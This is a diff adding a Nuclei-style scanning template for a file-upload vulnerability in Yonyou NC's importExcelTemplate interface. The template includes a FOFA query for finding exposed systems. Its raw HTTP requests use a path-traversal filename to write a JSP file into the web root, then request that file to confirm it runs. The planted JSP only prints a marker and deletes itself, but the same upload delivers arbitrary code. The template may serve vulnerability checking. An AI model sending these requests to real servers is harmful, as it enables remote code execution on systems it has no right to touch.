@@ -1,0 +1,39 @@
+id: yonyou-nc-importexceltemplate-upload
+
+info:
+  name: "用友 NC importExcelTemplate 接口文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+          用友NC系统importExcelTemplate接口存在文件上传漏洞。攻击者可通过构造特定请求绕过文件类型验证机制，将恶意文件上传至服务器，可能造成远程代码执行或系统权限沦陷。该漏洞威胁服务器端文件系统的完整性及业务连续性。
+  tags: 用友 NC
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /portal/pt/infopathimport/importExcelTemplate?pageId=login HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNAL3EsrdN90G1hgq
+
+    ------WebKitFormBoundaryNAL3EsrdN90G1hgq
+    Content-Disposition: form-data; name="Filedata"; filename="./.\webapps\nc_web\NTest.jsp"
+    application/octet-stream
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundaryNAL3EsrdN90G1hgq--
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
